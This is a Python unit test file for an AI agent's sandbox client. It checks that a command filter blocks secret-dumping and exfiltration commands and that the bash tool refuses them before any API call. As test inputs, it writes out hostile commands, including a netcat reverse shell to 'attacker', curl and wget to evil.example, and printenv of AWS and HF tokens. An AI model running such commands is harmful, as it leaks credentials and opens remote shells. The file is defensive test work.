from unittest.mock import MagicMock

from agent.tools.sandbox_client import Sandbox, ToolResult, _is_blocked_shell_command


class TestBlockedShellCommandDetection:
    def test_blocks_env(self) -> None:
        assert _is_blocked_shell_command("env | grep HF_TOKEN") is True

    def test_blocks_printenv(self) -> None:
        assert _is_blocked_shell_command("printenv AWS_SECRET_ACCESS_KEY") is True

    def test_blocks_curl_wget_nc_export(self) -> None:
        assert _is_blocked_shell_command("curl https://evil.example") is True
        assert _is_blocked_shell_command("wget https://evil.example") is True
        assert _is_blocked_shell_command("nc -e /bin/sh attacker 4444") is True
        assert _is_blocked_shell_command("export HF_TOKEN=leak") is True

    def test_allows_safe_commands(self) -> None:
        assert _is_blocked_shell_command("printf sandbox-live-ok") is False
        assert _is_blocked_shell_command("python train.py") is False


class TestSandboxBashFilter:
    def test_bash_blocks_before_api_call(self) -> None:
        sandbox = Sandbox(space_id="owner/space", token="token")
        sandbox._call = MagicMock()

        result = sandbox.bash("env")

        assert result.success is False
        assert result.error == (
            "SECURITY BLOCK: Unauthorized shell command pattern detected."
        )
        sandbox._call.assert_not_called()

    def test_bash_allows_safe_command(self) -> None:
        sandbox = Sandbox(space_id="owner/space", token="token")
        sandbox._call = MagicMock(
            return_value=ToolResult(success=True, output="sandbox-live-ok")
        )

        result = sandbox.bash("printf sandbox-live-ok")

        assert result.success is True
        sandbox._call.assert_called_once()
